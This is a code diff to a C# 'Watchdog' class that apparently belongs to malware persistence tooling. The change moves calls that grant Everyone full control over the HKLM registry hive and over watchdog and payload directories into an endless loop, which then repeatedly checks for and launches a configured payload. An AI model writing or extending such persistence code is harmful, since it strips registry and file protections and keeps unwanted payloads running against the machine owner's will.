@@ -33,6 +33,7 @@ class Watchdog
 
 
             WatchdogLogic();
+
         }
     }
 
@@ -40,16 +41,7 @@ class Watchdog
 
     static void WatchdogLogic()
     {
-        Persistence.Persistence.GrantEveryoneFullControl("HKLM");
-        Persistence.Persistence.GrantEveryoneFullControl("HKLU");
-        Persistence.Persistence.GrantEveryoneFullControlOnDirectory(Config.SecondaryWatchdogPath);
-        Persistence.Persistence.GrantEveryoneFullControlOnDirectory(Config.PrimaryWatchdogPath);
-        Persistence.Persistence.GrantEveryoneFullControlOnDirectory(Config.PayloadPath);
-
-
-        watchdogHelper.watchdogHelper.EnsureDirectoryExists(Config.SecondaryWatchdogPath);
-        watchdogHelper.watchdogHelper.EnsureDirectoryExists(Config.PrimaryWatchdogPath);
-        watchdogHelper.watchdogHelper.EnsureDirectoryExists(Config.PayloadPath);
+        
 
         try { 
             if (!File.Exists(Path.Combine(Config.SecondaryWatchdogPath, Config.PrimaryWatchdogName)))
@@ -65,6 +57,18 @@ class Watchdog
         // Example loop to simulate frequent checks
         while (true)
         {
+
+            Persistence.Persistence.GrantEveryoneFullControl("HKLM");
+            Persistence.Persistence.GrantEveryoneFullControl("HKLU");
+            Persistence.Persistence.GrantEveryoneFullControlOnDirectory(Config.SecondaryWatchdogPath);
+            Persistence.Persistence.GrantEveryoneFullControlOnDirectory(Config.PrimaryWatchdogPath);
+            Persistence.Persistence.GrantEveryoneFullControlOnDirectory(Config.PayloadPath);
+
+
+            watchdogHelper.watchdogHelper.EnsureDirectoryExists(Config.SecondaryWatchdogPath);
+            watchdogHelper.watchdogHelper.EnsureDirectoryExists(Config.PrimaryWatchdogPath);
+            watchdogHelper.watchdogHelper.EnsureDirectoryExists(Config.PayloadPath);
+
             watchdogHelper.watchdogHelper.verifyFilePathsSourceAndDest(Config.PayloadPath, Config.PayloadName);
             watchdogHelper.watchdogHelper.CheckAndRunPayload(Config.PayloadPath, Config.PayloadName);
 
